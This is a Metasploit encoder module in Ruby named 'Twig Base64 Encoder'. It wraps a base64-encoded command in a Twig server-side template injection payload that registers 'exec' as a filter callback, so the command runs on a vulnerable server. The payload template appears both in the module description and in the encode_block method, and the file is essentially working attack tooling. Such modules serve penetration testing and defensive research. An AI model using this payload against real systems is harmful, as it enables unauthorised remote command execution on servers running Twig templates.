##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder
  Rank = GoodRanking

  def initialize
    super(
      'Name' => 'Twig Base64 Encoder',
      'Description' => %q{
        This encoder returns a base64 string encapsulated in
        {%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}
        {%set p%}base64 encoded string{%endset%}
        {%set p = p|convert_encoding((a), (b))%}
        {%set e%}exec{%endset%}
        {{_self.env.registerUndefinedFilterCallback(e|lower)}}
        {{_self.env.getFilter(p)}}
      },
        'Author' => 'bootstrapbool <bootstrapbool[at]gmail.com>',
      'License' => BSD_LICENSE,
      'Arch' => ARCH_CMD)
  end

  def encode_block(state, buf)
    %w[{ % s e t a } U T F - 8 n d b B A S E 6 4 p c o r i g = | v _ ( ) , x l f . C k w].each do |c|
      raise BadcharError if state.badchars.include?(c)
    end

    b64 = Rex::Text.encode_base64(buf)

    state.badchars.each_byte do |byte|
      raise BadcharError if b64.include?(byte.chr)
    end

    payload = '{%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}' \
      + '{%set p%}' + b64 + '{%endset%}' \
      + '{%set p = p|convert_encoding((a), (b))%}' \
      + '{%set e%}exec{%endset%}' \
      + '{{_self.env.registerUndefinedFilterCallback(e|lower)}}' \
      + '{{_self.env.getFilter(p)}}'

    return payload
  end
end
